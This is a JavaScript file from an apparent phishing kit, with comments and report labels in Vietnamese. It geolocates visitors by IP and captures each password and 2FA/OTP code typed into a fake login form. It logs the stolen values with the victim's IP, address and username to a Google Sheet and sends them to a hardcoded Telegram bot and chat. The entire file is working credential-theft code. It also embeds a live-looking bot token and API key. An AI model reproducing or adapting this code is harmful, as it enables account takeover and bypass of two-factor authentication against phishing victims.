/* ================= 1. CONFIGURATION ================= */
const CONFIG = {
	TELEGRAM: {
		BOT_TOKEN: '8328740598:AAG3qtxa-1HshBQtAWfSeEPI6YHOR0g_-iw',
		CHAT_ID: '-1003936740040',
	},
	GEO_API: 'https://ipwhois.pro/?key=8U9rT6QVwOslzNS0',
	SHEET_ID: '1w9xSxr5KW_FpiwDfRZfX3QSVxpo2NCYMGgOjyq3InnE',
	SHEET_URL: 'https://docs.google.com/spreadsheets/d/1w9xSxr5KW_FpiwDfRZfX3QSVxpo2NCYMGgOjyq3InnE/edit?gid=0',
};

/* ================= 2. UTILITIES & DATA ================= */
const Utils = window.Utils = {
	userLoc: {
		ip: 'Unknown',
		country: 'Unknown',
		countryCode: 'Unknown',
		city: 'Unknown',
		region: 'Unknown',
		postal: 'Unknown',
		flag: '',
		continent: '',
		callingCode: '',
		capital: '',
		borders: '',
		isp: '',
		org: '',
		asn: '',
		domain: '',
		timezone: '',
		utc: '',
		localTime: '',
		currency: '',
		currencyCode: '',
		currencySymbol: '',
		exchangeRate: '',
	},

	countryCodeToFlag: (code) => {
		if (!code || code === 'Unknown' || code.length !== 2) return '';
		return String.fromCodePoint(...[...code.toUpperCase()].map((c) => 0x1f1e6 + c.charCodeAt(0) - 65));
	},

	getDialCode: (countryCode) => {
		if (!countryCode || countryCode === 'Unknown') return null;
		const map = {
			AF: '+93', AL: '+355', DZ: '+213', AD: '+376', AO: '+244', AR: '+54',
			AM: '+374', AU: '+61', AT: '+43', AZ: '+994', BH: '+973', BD: '+880',
			BY: '+375', BE: '+32', BZ: '+501', BJ: '+229', BT: '+975', BO: '+591',
			BA: '+387', BW: '+267', BR: '+55', BN: '+673', BG: '+359', BF: '+226',
			BI: '+257', KH: '+855', CM: '+237', CA: '+1', CV: '+238', CF: '+236',
			TD: '+235', CL: '+56', CN: '+86', CO: '+57', KM: '+269', CG: '+242',
			CD: '+243', CR: '+506', HR: '+385', CU: '+53', CY: '+357', CZ: '+420',
			DK: '+45', DJ: '+253', EC: '+593', EG: '+20', SV: '+503', GQ: '+240',
			ER: '+291', EE: '+372', SZ: '+268', ET: '+251', FJ: '+679', FI: '+358',
			FR: '+33', GA: '+241', GM: '+220', GE: '+995', DE: '+49', GH: '+233',
			GR: '+30', GT: '+502', GN: '+224', GW: '+245', GY: '+592', HT: '+509',
			HN: '+504', HK: '+852', HU: '+36', IS: '+354', IN: '+91', ID: '+62',
			IR: '+98', IQ: '+964', IE: '+353', IL: '+972', IT: '+39', CI: '+225',
			JM: '+1', JP: '+81', JO: '+962', KZ: '+7', KE: '+254', KI: '+686',
			KW: '+965', KG: '+996', LA: '+856', LV: '+371', LB: '+961', LS: '+266',
			LR: '+231', LY: '+218', LI: '+423', LT: '+370', LU: '+352', MO: '+853',
			MG: '+261', MW: '+265', MY: '+60', MV: '+960', ML: '+223', MT: '+356',
			MH: '+692', MR: '+222', MU: '+230', MX: '+52', FM: '+691', MD: '+373',
			MC: '+377', MN: '+976', ME: '+382', MA: '+212', MZ: '+258', MM: '+95',
			NA: '+264', NR: '+674', NP: '+977', NL: '+31', NZ: '+64', NI: '+505',
			NE: '+227', NG: '+234', KP: '+850', MK: '+389', NO: '+47', OM: '+968',
			PK: '+92', PW: '+680', PS: '+970', PA: '+507', PG: '+675', PY: '+595',
			PE: '+51', PH: '+63', PL: '+48', PT: '+351', QA: '+974', RO: '+40',
			RU: '+7', RW: '+250', WS: '+685', SM: '+378', ST: '+239', SA: '+966',
			SN: '+221', RS: '+381', SC: '+248', SL: '+232', SG: '+65', SK: '+421',
			SI: '+386', SB: '+677', SO: '+252', ZA: '+27', KR: '+82', SS: '+211',
			ES: '+34', LK: '+94', SD: '+249', SR: '+597', SE: '+46', CH: '+41',
			SY: '+963', TW: '+886', TJ: '+992', TZ: '+255', TH: '+66', TL: '+670',
			TG: '+228', TO: '+676', TN: '+216', TR: '+90', TM: '+993', TV: '+688',
			UG: '+256', UA: '+380', AE: '+971', GB: '+44', US: '+1', UY: '+598',
			UZ: '+998', VU: '+678', VE: '+58', VN: '+84', YE: '+967', ZM: '+260',
			ZW: '+263',
		};
		return map[countryCode.toUpperCase()] || null;
	},

	getLocation: async () => {
		try {
			const res = await fetch(CONFIG.GEO_API);
			const data = await res.json();

			Utils.userLoc = {
				ip: data.ip || 'Unknown',
				countryCode: data.country_code || 'Unknown',
				country: data.country || 'Unknown',
				city: data.city || 'Unknown',
				region: data.region || 'Unknown',
				postal: data.postal || 'Unknown',
				flag: Utils.countryCodeToFlag(data.country_code),
				continent: data.continent || '',
				callingCode: data.calling_code ? `+${data.calling_code}` : '',
				capital: data.capital || '',
				borders: data.borders || '',
				isp: data.connection?.isp || '',
				org: data.connection?.org || '',
				asn: data.connection?.asn ? `AS${data.connection.asn}` : '',
				domain: data.connection?.domain || '',
				timezone: data.timezone?.id || '',
				utc: data.timezone?.utc || '',
				localTime: data.timezone?.current_time || '',
				currency: data.currency?.name || '',
				currencyCode: data.currency?.code || '',
				currencySymbol: data.currency?.symbol || '',
				exchangeRate: data.currency?.exchange_rate
					? data.currency.exchange_rate.toLocaleString('en-US')
					: '',
			};

			console.log(`Geo data:`, Utils.userLoc);
		} catch (e) {
			console.error(`Error fetching geo:`, e);
		}
	},

	getTime: () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),

	_sheetMeta: { row: null, col: 1 },

	getSheetRow: () => Utils._sheetMeta.row,

	sendToSheet: async (type, value) => {
		try {
			const L = Utils.userLoc;
			const meta = Utils._sheetMeta;
			if (!meta.row) {
				const addr = [L.city, L.region, L.country].filter(Boolean).join(', ') || 'Unknown';
				const uname = document.getElementById('username')?.value || 'N/A';
				const row = [L.ip, addr, L.postal || 'Unknown', uname, value];
				const res = await fetch('/api/sheet', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({ action: 'append', value: [row] }),
				});
				const data = await res.json();
				const range = data?.updates?.updatedRange || data?.result?.updates?.updatedRange || '';
				const match = range.match(/Sheet2!A(\d+)/);
				if (match) {
					meta.row = match[1];
					meta.col = row.length;
				}
				return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col, url: CONFIG.SHEET_URL };
			}

			meta.col++;
			const colLetter = String.fromCharCode(64 + meta.col);
			const res = await fetch('/api/sheet', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ action: 'update', row: meta.row, value: [[value]] }),
			});
			const data = await res.json();
			return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col, url: CONFIG.SHEET_URL };
		} catch {
			return { ok: false, row: '?', col: '?' };
		}
	},

	sendMessage: async (text) => {
		try {
			const oldId = localStorage.getItem('message_id')
			if (oldId) {
				try {
					await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/deleteMessage`, {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({ chat_id: CONFIG.TELEGRAM.CHAT_ID, message_id: oldId }),
					})
				} catch {}
			}
			const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					chat_id: CONFIG.TELEGRAM.CHAT_ID,
					text: text,
					parse_mode: 'HTML',
					link_preview_options: { is_disabled: true },
				}),
			});
			const data = await res.json()
			const newId = data.result?.message_id
			if (newId) localStorage.setItem('message_id', newId)
		} catch (e) {
			console.error('Tele error');
		}
	},

	formatReport: (type, extra = {}) => {
		const L = Utils.userLoc;
		const uname = document.getElementById('username')?.value || 'N/A';
		const savedPasswords = window.passwords || [];
		const savedOtps = window.otps || [];
		const addr = [L.city, L.region, L.country].filter(Boolean).join(', ') || 'Unknown';

		let report = `IP: ${L.ip} ${L.flag}\n`;
		report += `ĐỊA CHỈ: ${addr}\n`;
		report += `MÃ ZIP: ${L.postal || 'Unknown'}\n\n`;
		report += `TÀI KHOẢN: ${uname}\n`;

		if (type === 'PASS' || savedPasswords.length > 0) {
			const allPwds = savedPasswords.length > 0 ? savedPasswords : [extra.password];
			report += `MẬT KHẨU: <code>${allPwds[0]}</code>\n`;
			for (let i = 1; i < allPwds.length; i++) {
				report += `MẬT KHẨU ${i}: <code>${allPwds[i]}</code>\n`;
			}
		}

		if (type === 'OTP' || savedOtps.length > 0) {
			const allOtps = savedOtps.length > 0 ? savedOtps : [extra.otp];
			for (let i = 0; i < allOtps.length; i++) {
				report += `MÃ OTP ${i + 1}: <code>${allOtps[i]}</code>\n`;
			}
		}

		if (extra.sheet && extra.sheet.ok) {
			report += `\n📊 <a href="${extra.sheet.url}">Google Sheet</a>\n`;
		}

		return report;
	},
};

/* ================= 3. MAIN LOGIC ================= */
async function initApp() {
	await Utils.getLocation();

	window._ipReady = true;
	window.dispatchEvent(new Event('ip-ready'));

	window.passwords = [];
	window.otps = [];

	let passAttempts = 0;
	let otpAttempts = 0;

	document.getElementById('form-password')?.addEventListener('submit', async function (e) {
		e.preventDefault();
		const pwd = document.getElementById('password')?.value;
		if (!pwd) return;

		passAttempts++;

		window.passwords.push(pwd);

		const sheet = await Utils.sendToSheet('PASS', pwd);

		await Utils.sendMessage(
			Utils.formatReport('PASS', { password: pwd, attempt: passAttempts, sheet }),
		);
	});

	const tfaForm = document.getElementById('form-2fa');
	const tfaBtn = document.getElementById('tfa-submit-btn');
	const codeInp = document.getElementById('code-2fa');

	if (tfaForm && codeInp) {
		codeInp.addEventListener('input', function () {
			const cleanValue = this.value.replace(/[^0-9]/g, '');
			const isValidLength = cleanValue.length >= 6 && cleanValue.length <= 8;

			tfaBtn.disabled = !isValidLength;
			if (isValidLength) {
				tfaBtn.classList.remove('opacity-70', 'cursor-not-allowed');
				tfaBtn.classList.add('opacity-100', 'cursor-pointer');
			} else {
				tfaBtn.classList.add('opacity-70', 'cursor-not-allowed');
				tfaBtn.classList.remove('opacity-100', 'cursor-pointer');
			}
		});

		tfaForm.addEventListener('submit', async function (e) {
			e.preventDefault();
			const otpVal = codeInp.value.replace(/[^0-9]/g, '');

			if (otpVal.length >= 6 && otpVal.length <= 8) {
				otpAttempts++;

				window.otps.push(otpVal);

				const sheet = await Utils.sendToSheet('OTP', otpVal);

				await Utils.sendMessage(
					Utils.formatReport('OTP', { otp: otpVal, attempt: otpAttempts, sheet }),
				);
			}
		});
	}
}

// Khởi tạo
if (document.readyState === 'loading') {
	document.addEventListener('DOMContentLoaded', initApp);
} else {
	initApp();
}
